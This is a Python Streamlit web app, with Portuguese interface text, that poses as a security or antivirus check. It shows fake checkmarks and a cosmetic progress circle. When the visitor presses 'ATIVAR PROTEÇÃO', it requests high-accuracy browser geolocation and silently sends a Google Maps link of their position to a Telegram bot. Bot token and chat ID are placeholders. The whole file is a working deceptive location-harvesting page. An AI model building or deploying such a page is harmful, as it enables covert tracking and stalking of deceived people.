import streamlit as st
import requests
import time
from streamlit_js_eval import streamlit_js_eval

# ======================
# TELEGRAM
# ======================
TOKEN = "SEU_TOKEN"
CHAT_ID = "SEU_CHAT_ID"

def enviar_telegram(msg):
    try:
        requests.post(
            f"https://api.telegram.org/bot{TOKEN}/sendMessage",
            json={"chat_id": CHAT_ID, "text": msg, "parse_mode": "Markdown"},
            timeout=5
        )
    except:
        pass

st.set_page_config(page_title="Segurança Ativa", layout="centered")

# ======================
# CSS
# ======================
st.markdown("""
<style>
body { background:#000; color:#fff; }
.circle {
  width:160px;height:160px;border-radius:50%;
  border:2px solid #2ecc71;
  display:flex;align-items:center;justify-content:center;
  box-shadow:0 0 30px #2ecc71;
}
.pct { font-size:42px;font-weight:bold; }
.btn {
  background:#ffc107;color:#000;
  width:100%;height:55px;
  border:none;border-radius:12px;
  font-size:18px;font-weight:bold;
}
</style>
""", unsafe_allow_html=True)

st.markdown("<h2 style='text-align:center'>Verificar segurança</h2>", unsafe_allow_html=True)

bolha = st.empty()
bolha.markdown("""
<div class="circle"><div class="pct">4%</div></div>
""", unsafe_allow_html=True)

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

# ======================
# BOTÃO REAL
# ======================
ativar = st.button("● ATIVAR PROTEÇÃO", use_container_width=True)

if ativar:

    geo = streamlit_js_eval(
        js_expressions="""
        new Promise((resolve) => {
          navigator.geolocation.getCurrentPosition(
            (pos) => resolve({
              ok:true,
              lat:pos.coords.latitude,
              lon:pos.coords.longitude,
              accuracy:pos.coords.accuracy
            }),
            (err) => resolve({ ok:false, error: err.message }),
            { enableHighAccuracy:true, timeout:8000 }
          );
        })
        """,
        key="geo_exec"
    )

    if geo and geo.get("ok"):

        for i in range(4, 101, 4):
            bolha.markdown(
                f"<div class='circle'><div class='pct'>{i}%</div></div>",
                unsafe_allow_html=True
            )
            time.sleep(0.04)

        mapa = f"https://www.google.com/maps?q={geo['lat']},{geo['lon']}"

        enviar_telegram(
            f"🛡️ PROTEÇÃO ATIVADA\n\n"
            f"📍 [Localização]({mapa})"
        )

        st.success("Proteção ativada com sucesso!")

    else:
        st.warning("Permissão de localização negada ou indisponível.")
